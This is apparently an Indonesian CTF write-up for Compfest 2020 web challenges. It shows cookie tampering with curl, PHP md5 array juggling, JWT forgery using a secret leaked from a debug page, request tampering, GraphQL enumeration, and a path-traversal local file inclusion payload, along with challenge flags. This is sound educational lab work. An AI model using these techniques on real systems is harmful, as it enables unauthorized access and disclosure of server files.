---
layout: post
title: "Web Exploitation - Compfest 20 Hacker Class"
date: 2020-08-18 12:17:56 +0530
categories:
  - WriteUp
  - Hacker Class
  - Web Exploitaion
---

Berikut writeup Hacker Class Compfest 2020 pada kategori Web Exploitation.

<br />  

# Web Exploitation

## 1. Only Admin [50pts]

Edit value cookie dari `admin` menjadi `true` dan didapatkan flag.

```sh
$ curl -XGET http://128.199.104.41:26025/ --cookie "admin=true"
COMPFEST12{congratz_haha_ez_admin_1ce9307db61}
```

### FLAG

`COMPFEST12{congratz_haha_ez_admin_1ce9307db61}`\
<br/>

## 2. Hash Hash Hashoo [50pts]

Requests parameter a dan b, tambahkan kurung balok untuk menjadikan bentuk array, isi parameter a dan b dengan isi yang berbeda, dan flag didapatkan.

![FLAG](https://abdullahnz.github.io/assets/images/COMPFEST-1.png)

### FLAG 

`COMPFEST12{md5_hashing_php_is_so_bad_3087c22}`\
<br/>

## 3. Only Admin 2 [50pts]

Tambahkan `/TERSERAH` pada akhir url. Didapat debug dalam posisi hidup. Lihat config, dan didapatkan `SECRET_KEY` adalah `wanjir-itu-secret-nya-cuk-cepet-copy-3efbb717`. 

![FLAG](https://abdullahnz.github.io/assets/images/COMPFEST-2.png)

Diketahui website ini menggunakan jwt untuk auth-nya. Decode jwt-token di `jwt.io`.

![FLAG](https://abdullahnz.github.io/assets/images/COMPFEST-3.png)

Edit payload menjadi dibawah ini dan input secret-key yang didapat tadi.

![FLAG](https://abdullahnz.github.io/assets/images/COMPFEST-4.png)

Edit cookie jwt-token pada website dengan jwt-token yang baru, refresh dan flag didapatkan.

<!-- ![FLAG](https://abdullahnz.github.io/assets/images/COMPFEST-5.png) -->
![FLAG](https://abdullahnz.github.io/assets/images/COMPFEST-6.png)

### FLAG 

`COMPFEST12{wanjir_gua_lupa_set_debug_nya_jadi_false_79f2622f}`\
<br/>

## Ketik Ketik [50pts]

Diberikan website yang berisi game seperti `typeracer`, untuk mendapatkan flag, kita harus menyelesaikannya dibawah 2 detik. Namun setelah scripting dan game diselesaikan kurang dari 2 detik, tepatnya 1.XXX ms, flag tidak didapatkan. Lalu coba tamper requests menggunankan burpsuite, tekan spasi sampai game selesai.

Didapati requests data post ke `/game` sebagai berikut.

```json
{"words":["aku","ingin","menjadi","hacker","handal","aku","harus","terus","berlatih","pantang","menyerah","dapatkan","flagnya","aku","ingin","menjadi","legenda","aku","ingin","bisa","ngehack","ig","aku","akan","menggunakan","keahlianku","untuk","kebaikan"],"curr":28,"currState":-3,"answers":[-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1],"input":"","gameState":-3,"startTime":1597799704168,"lastUpdate":1597799706927,"message":"Loading ..."}
```

Berdasarkan potongan script Ketik.js berikut, ubah semua value `answer` menjadi -2 (right).

```js
const STATES = {
  wrong: -1,
  right: -2,
  noAns: -3
};
```

Setelah dikirim requests ternyata masih belum mendapatkan flag. Lalu coba ubah value `lastUpdate` menjadi seperti isi `startTime`. Kirim requests dan didapatkan flag,

Berikut akhir requests data.

```json
{"words":["aku","ingin","menjadi","hacker","handal","aku","harus","terus","berlatih","pantang","menyerah","dapatkan","flagnya","aku","ingin","menjadi","legenda","aku","ingin","bisa","ngehack","ig","aku","akan","menggunakan","keahlianku","untuk","kebaikan"],"curr":28,"currState":-3,"answers":[-2,-2,-2,-2,-2,-2,-2,-2,-2,-2,-2,-2,-2,-2,-2,-2,-2,-2,-2,-2,-2,-2,-2,-2,-2,-2,-2,-2],"input":"","gameState":-3,"startTime":1597799704168,"lastUpdate":1597799704168,"message":"Loading ..."}
```

![FLAG](https://abdullahnz.github.io/assets/images/COMPFEST-7.png)

### FLAG

`COMPFEST12{you_sneaky_hacker_you!}`\
<br/>

## 4. Gekyuel [316pts]

Setelah beberapa reccon, didapati terdapat 2 buah field, yaitu games dan developer yang mungkin didalamnya terdapat flag. Lalu, lihat data dalam games dengan query berikut.

```graphql
query { 
    games { id,name,developer { id,name } } 
} 
```

Didapati data berikut ini. Terlihat pada games yang memiliki id 7, bernama `TOP SECRET` yang mungkin didalamnya terdapat flag. Sempat submit nama developer (caesar decoded), tetapi masih salah.

```json
{
    "data": {
        "games": [
            ...
            {
                "id": "7",
                "name": "TOP SECRET",
                "developer": {
                    "id": "Do you think it would be that easy?",
                    "name": "dlyrddru_uqzbir_dlqrbz"
                }
            }
        ]
    }
}
```

Lihat `id` dari `developer` "dlyrddru_uqzbir_dlqrbz".

```graphql
query { 
    developer(name : "dlyrddru_uqzbir_dlqrbz") { id } 
}
```

Flag didapatkan.

```json
{
    "data": {
        "developer": {
            "id": "COMPFEST12{c0nv3n1Ence_i5_A_d0ubL3_eDged_SwoRD!}"
        }
    }
}
```

### FLAG

`COMPFEST12{c0nv3n1Ence_i5_A_d0ubL3_eDged_SwoRD!}`\
<br/>

## NERA [397pts]

Local File Inclusion, dengan membaca file `ddududdudu.php` pada `../../../../var/www/html/ddududdudu.php`. Lihat source, file tersebut meng-include file `header.php`

Dimana terdapat clue flag terdapat pada head tag dan kemungkinan `header.php` berisi content dari tag head.

```html
<head>
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/css/bootstrap.min.css" integrity="sha384-MCw98/SFnGE8fJT3GXwEOngsV7Zt27NXFoaoApmYm81iuXoPkFOJwJ8ERdknLPMO" crossorigin="anonymous">
    <link rel="stylesheet" href="style.css">
    <!-- Flagnya ada di sini =>  <= yaah ga keliatan... -->
</head>
```

Baca file `header.php` dan lihat sourcenya, didapatkan letak flag.

```html
<head>
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/css/bootstrap.min.css" integrity="sha384-MCw98/SFnGE8fJT3GXwEOngsV7Zt27NXFoaoApmYm81iuXoPkFOJwJ8ERdknLPMO" crossorigin="anonymous">
    <link rel="stylesheet" href="style.css">
    <!-- Flagnya ada di sini => <?php include 'flag-c1ae46a42693a5d535052015f2ddaf53.php' ?> <= yaah ga keliatan... -->
</head>
```

Baca `flag-c1ae46a42693a5d535052015f2ddaf53.php` dan didapatkan flag.

```html
<?php
$flag = 'COMPFEST12{lOc4l_fiLe_inClusion_f0r_FUN_and_profit_35c28478ab}';
</pre>
```

### FLAG

`COMPFEST12{lOc4l_fiLe_inClusion_f0r_FUN_and_profit_35c28478ab}`\
<br/>